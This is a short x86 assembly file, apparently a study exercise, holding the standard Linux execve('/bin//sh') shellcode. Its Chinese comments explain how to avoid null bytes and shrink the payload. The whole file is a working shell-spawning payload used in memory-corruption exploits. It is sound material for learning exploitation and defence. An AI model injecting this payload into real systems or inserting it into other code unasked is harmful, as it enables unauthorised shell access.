; section .data
; 	string db '/bin//sh'
; section .text
global _start
	_start:
		; execve
		; 这里需要保证 '/bin//sh' 以 0 结尾
		; 因此需要在汇编中写入代码手动将其调整为 0
		xor ecx, ecx
		; hex("/bin//sh") = 0x2f62696e2f2f7368
		push ecx ; string must end with \x00
		push 68732f2fH
		push 6e69622fH
		mov ebx, esp
		; xor eax, eax
		; mov al, 0bH
		; use push pop to cut down the shellcode
		push byte 0bH
		pop eax
		cdq ; set edx = 0
		int 80H	
